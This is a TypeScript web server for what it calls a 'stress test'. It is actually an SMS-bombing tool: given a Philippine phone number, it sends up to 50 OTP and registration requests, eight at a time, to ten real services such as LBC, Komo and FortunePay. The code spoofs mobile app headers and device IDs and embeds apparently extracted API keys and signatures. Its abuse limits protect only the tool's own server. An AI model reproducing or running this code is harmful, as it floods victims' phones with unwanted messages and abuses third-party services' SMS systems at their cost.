import express from "express";
import { createServer as createViteServer } from "vite";
import { WebSocketServer, WebSocket } from "ws";
import axios from "axios";
import path from "path";
import { fileURLToPath } from "url";
import helmet from "helmet";
import rateLimit from "express-rate-limit";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  // Security Headers
  app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
  }));

  // Rate Limiting
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    standardHeaders: true,
    legacyHeaders: false,
  });
  app.use("/api/", limiter);

  app.use(express.json({ limit: "1kb" }));

  // Vite middleware for development
  let vite;
  if (process.env.NODE_ENV !== "production") {
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const server = app.listen(Number(PORT), "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });

  const wss = new WebSocketServer({ 
    server,
    verifyClient: (info, callback) => {
      const origin = info.origin || info.req.headers.origin;
      const allowedOrigins = [
        "http://localhost:3000",
        "https://ais-dev-q6dj35v5g7nj375i6tczo7-620104441534.asia-east1.run.app",
        "https://ais-pre-q6dj35v5g7nj375i6tczo7-620104441534.asia-east1.run.app"
      ];
      if (!origin || allowedOrigins.some(o => origin.startsWith(o))) {
        callback(true);
      } else {
        callback(false, 403, "Forbidden Origin");
      }
    }
  });

  const abuseTracker = new Map<string, { count: number; lastTest: number; isTesting: boolean }>();
  const bannedIPs = new Set<string>();
  const uniqueUsers = new Set<string>();
  const activeConnections = new Map<string, number>();
  let totalLikes = 0;

  const broadcastStats = () => {
    const stats = {
      type: "GLOBAL_STATS",
      payload: {
        totalLikes,
        totalUsers: uniqueUsers.size
      }
    };
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(stats));
      }
    });
  };

  wss.on("connection", (ws, req) => {
    const ip = req.headers['x-forwarded-for']?.toString() || req.socket.remoteAddress || 'unknown';
    
    const currentConns = activeConnections.get(ip) || 0;
    if (currentConns >= 3) {
      ws.send(JSON.stringify({ type: "ERROR", payload: { message: "Too many concurrent connections." } }));
      ws.close();
      return;
    }
    activeConnections.set(ip, currentConns + 1);

    uniqueUsers.add(ip);
    broadcastStats();
    
    if (bannedIPs.has(ip)) {
      ws.send(JSON.stringify({ type: "BANNED", payload: { message: "Your IP has been permanently banned for repeated abuse." } }));
      ws.close();
      return;
    }

    const sessionToken = Math.random().toString(36).substring(2, 15);
    ws.send(JSON.stringify({ type: "SESSION_INIT", payload: { token: sessionToken } }));

    ws.on("message", async (message) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.type === "START_TEST") {
          if (data.payload.token !== sessionToken) {
            ws.send(JSON.stringify({ type: "ERROR", payload: { message: "Security token mismatch." } }));
            return;
          }

          const { phoneNumber, totalRequests } = data.payload;
          if (!phoneNumber || !/^\d{10,12}$/.test(phoneNumber)) {
            ws.send(JSON.stringify({ type: "ERROR", payload: { message: "Invalid phone number." } }));
            return;
          }
          
          let tracker = abuseTracker.get(ip) || { count: 0, lastTest: 0, isTesting: false };
          const now = Date.now();

          // Abuse check: Already testing
          if (tracker.isTesting) {
            tracker.count++;
            abuseTracker.set(ip, tracker);
            if (tracker.count >= 3) {
              bannedIPs.add(ip);
              ws.send(JSON.stringify({ type: "BANNED", payload: { message: "Permanent ban: Repeated abuse detected." } }));
              ws.close();
              return;
            }
            ws.send(JSON.stringify({ type: "ERROR", payload: { message: `Abuse Warning (${tracker.count}/3): Test already in progress.` } }));
            return;
          }

          // Abuse check: Cooldown bypass
          if (now - tracker.lastTest < 30000 && tracker.lastTest !== 0) {
            tracker.count++;
            abuseTracker.set(ip, tracker);
            if (tracker.count >= 3) {
              bannedIPs.add(ip);
              ws.send(JSON.stringify({ type: "BANNED", payload: { message: "Permanent ban: Repeated abuse detected." } }));
              ws.close();
              return;
            }
            ws.send(JSON.stringify({ type: "ERROR", payload: { message: `Abuse Warning (${tracker.count}/3): Cooldown active.` } }));
            return;
          }

          // Abuse check: Limit bypass
          if (totalRequests > 50) {
            tracker.count++;
            abuseTracker.set(ip, tracker);
            if (tracker.count >= 3) {
              bannedIPs.add(ip);
              ws.send(JSON.stringify({ type: "BANNED", payload: { message: "Permanent ban: Repeated abuse detected." } }));
              ws.close();
              return;
            }
            ws.send(JSON.stringify({ type: "ERROR", payload: { message: `Abuse Warning (${tracker.count}/3): Request limit exceeded.` } }));
            return;
          }

          tracker.isTesting = true;
          tracker.lastTest = now;
          abuseTracker.set(ip, tracker);

          await runStressTest(ws, phoneNumber, totalRequests, ip, abuseTracker);
          
          tracker = abuseTracker.get(ip)!;
          tracker.isTesting = false;
          abuseTracker.set(ip, tracker);
        } else if (data.type === "LIKE") {
          totalLikes++;
          broadcastStats();
        }
      } catch (error) {
        console.error("WebSocket message error:", error);
      }
    });

    ws.on("close", () => {
      const conns = activeConnections.get(ip) || 1;
      if (conns <= 1) activeConnections.delete(ip);
      else activeConnections.set(ip, conns - 1);
    });
  });

  // Fallback for SPA
  if (process.env.NODE_ENV === "production") {
    app.get('*', (req, res) => {
      res.sendFile(path.join(process.cwd(), 'dist', 'index.html'));
    });
  }
}

interface ServiceResult {
  serviceName: string;
  success: boolean;
  statusCode?: number;
  errorMessage?: string;
}

const randomString = (length: number) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const formatPhoneNumber = (number: string) => {
  return number.startsWith('0') ? number.replace('0', '+63') : `+63${number}`;
};

const services = [
  {
    name: "S5.com",
    fn: async (num: string): Promise<ServiceResult> => {
      const formattedNum = formatPhoneNumber(num);
      const boundary = "----WebKitFormBoundary" + randomString(16);
      const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formattedNum}\r\n--${boundary}--\r\n`;
      try {
        const res = await axios.post('https://api.s5.com/player/api/v1/otp/request', data, {
          headers: {
            'authority': 'api.s5.com',
            'accept': 'application/json, text/plain, */*',
            'content-type': `multipart/form-data; boundary=${boundary}`,
            'origin': 'https://www.s5.com',
            'referer': 'https://www.s5.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-api-type': 'external',
            'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
          },
          timeout: 10000
        });
        return { serviceName: "S5.com", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "S5.com", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "Xpress PH",
    fn: async (num: string): Promise<ServiceResult> => {
      const formattedNum = formatPhoneNumber(num);
      try {
        const res = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
          "FirstName": "toshi",
          "LastName": "premium",
          "Email": `toshi${Date.now()}@gmail.com`,
          "Phone": formattedNum,
          "Password": "ToshiPass123",
          "ConfirmPassword": "ToshiPass123",
          "ImageUrl": "",
          "RoleIds": [4],
          "Area": "manila",
          "City": "manila",
          "PostalCode": "1000",
          "Street": "toshi_street",
          "ReferralCode": "",
          "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
          "FingerprintRequestId": "1757149666261.Rr1VvG",
        }, {
          headers: {
            "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
            "Accept": "application/json",
            "Content-Type": "application/json",
          },
          timeout: 10000
        });
        return { serviceName: "Xpress PH", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "Xpress PH", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "Abenson",
    fn: async (num: string): Promise<ServiceResult> => {
      try {
        const res = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
          `contact_no=${num}&login_token=undefined`, 
          {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
              'Accept': 'application/json',
              'Content-Type': 'application/x-www-form-urlencoded',
              'x-requested-with': 'com.abensonmembership.cloone',
            },
            timeout: 10000
          }
        );
        return { serviceName: "Abenson", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "Abenson", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "Excellente Lending",
    fn: async (num: string): Promise<ServiceResult> => {
      const coordinates = [
        { lat: '14.5995', long: '120.9842' },
        { lat: '14.6760', long: '121.0437' },
        { lat: '14.8648', long: '121.0418' }
      ];
      const coord = coordinates[Math.floor(Math.random() * coordinates.length)];
      try {
        const res = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
          "domain": num,
          "cat": "login",
          "previous": false,
          "financial": "efe35521e51f924efcad5d61d61072a9"
        }, {
          headers: {
            'User-Agent': 'okhttp/4.12.0',
            'Content-Type': 'application/json; charset=utf-8',
            'x-version': '1.1.2',
            'x-package-name': 'com.support.excellenteralending',
            'x-adid': 'efe35521e51f924efcad5d61d61072a9',
            'x-latitude': coord.lat,
            'x-longitude': coord.long
          },
          timeout: 10000
        });
        return { serviceName: "Excellente Lending", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "Excellente Lending", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "FortunePay",
    fn: async (num: string): Promise<ServiceResult> => {
      const phone = num.startsWith('0') ? num.substring(1) : num;
      try {
        const res = await axios.post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
          "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
          "deviceType": 'GOOGLE_PLAY',
          "companyId": '4bf735e97269421a80b82359e7dc2288',
          "dialCode": '+63',
          "phoneNumber": phone
        }, {
          headers: {
            'User-Agent': 'Dart/3.6 (dart:io)',
            'Content-Type': 'application/json',
            'app-type': 'GOOGLE_PLAY',
            'app-version': '4.3.5',
            'timestamp': Date.now().toString(),
            'nonce': `${randomString(10)}-${Date.now()}`
          },
          timeout: 10000
        });
        return { serviceName: "FortunePay", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "FortunePay", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "WeMove",
    fn: async (num: string): Promise<ServiceResult> => {
      const phone = num.startsWith('0') ? num.substring(1) : num;
      try {
        const res = await axios.post('https://api.wemove.com.ph/auth/users', {
          "phone_country": '+63',
          "phone_no": phone
        }, {
          headers: {
            'User-Agent': 'okhttp/4.9.3',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'xuid_type': 'user',
            'source': 'customer',
          },
          timeout: 10000
        });
        return { serviceName: "WeMove", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "WeMove", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "LBC",
    fn: async (num: string): Promise<ServiceResult> => {
      const phone = num.startsWith('0') ? num.substring(1) : num;
      try {
        const res = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
          new URLSearchParams({
            'verification_type': 'mobile',
            'client_email': `${randomString(8)}@gmail.com`,
            'client_contact_code': '+63',
            'client_contact_no': phone,
            'app_log_uid': randomString(16),
            'app_platform': 'Android',
            'device_name': 'rosemary_p_global',
            'device_os': 'Android15',
            'device_brand': 'Xiaomi',
            'app_version': '3.0.67',
            'app_framework': 'lbc_app',
            'app_environment': 'production',
            'app_hash': randomString(32),
          }).toString(),
          {
            headers: {
              'User-Agent': 'Dart/2.19 (dart:io)',
              'Content-Type': 'application/x-www-form-urlencoded',
              'api': 'LBC',
              'token': 'CONNECT'
            },
            timeout: 10000
          }
        );
        return { serviceName: "LBC", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "LBC", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "Pickup Coffee",
    fn: async (num: string): Promise<ServiceResult> => {
      const formattedNum = formatPhoneNumber(num);
      try {
        const res = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', {
          "mobile_number": formattedNum,
          "login_method": 'mobile_number'
        }, {
          headers: {
            'User-Agent': 'okhttp/4.12.0',
            'Content-Type': 'application/json',
            'x-env': 'Production',
            'x-app-version': '2.7.0'
          },
          timeout: 10000
        });
        return { serviceName: "Pickup Coffee", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "Pickup Coffee", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "HoneyLoan",
    fn: async (num: string): Promise<ServiceResult> => {
      try {
        const res = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', {
          "phone": num,
          "is_rights_block_accepted": 1
        }, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'origin': 'https://honeyloan.ph',
            'referer': 'https://honeyloan.ph/',
            'x-requested-with': 'com.startupcalculator.caf'
          },
          timeout: 10000
        });
        return { serviceName: "HoneyLoan", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "HoneyLoan", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  },
  {
    name: "Komo",
    fn: async (num: string): Promise<ServiceResult> => {
      try {
        const res = await axios.post('https://api.komo.ph/api/otp/v5/generate', {
          "mobile": num,
          "transactionType": 6
        }, {
          headers: {
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
            'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
          },
          timeout: 10000
        });
        return { serviceName: "Komo", success: res.status >= 200 && res.status < 300, statusCode: res.status };
      } catch (e: any) {
        return { serviceName: "Komo", success: false, statusCode: e.response?.status, errorMessage: e.message };
      }
    }
  }
];

async function runStressTest(ws: WebSocket, phoneNumber: string, totalRequests: number, ip: string, abuseTracker: Map<string, any>) {
  const count = Math.min(totalRequests, 50);
  let completed = 0;
  let successful = 0;
  let failed = 0;

  const maxConcurrent = 8;
  const queue = Array.from({ length: count }, (_, i) => i);

  const processQueue = async () => {
    while (queue.length > 0) {
      const index = queue.shift();
      if (index === undefined) break;

      // Check if client is still connected
      if (ws.readyState !== WebSocket.OPEN) {
        return;
      }

      const service = services[index % services.length];
      const result = await service.fn(phoneNumber);

      completed++;
      if (result.success) successful++;
      else failed++;

      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: "PROGRESS",
          payload: {
            result,
            stats: {
              completed,
              successful,
              failed,
              total: count
            }
          }
        }));
      }
    }
  };

  const workers = Array.from({ length: maxConcurrent }, () => processQueue());
  await Promise.all(workers);

  if (ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: "COMPLETE",
      payload: {
        stats: {
          completed,
          successful,
          failed,
          total: count
        }
      }
    }));
  }
}

startServer();
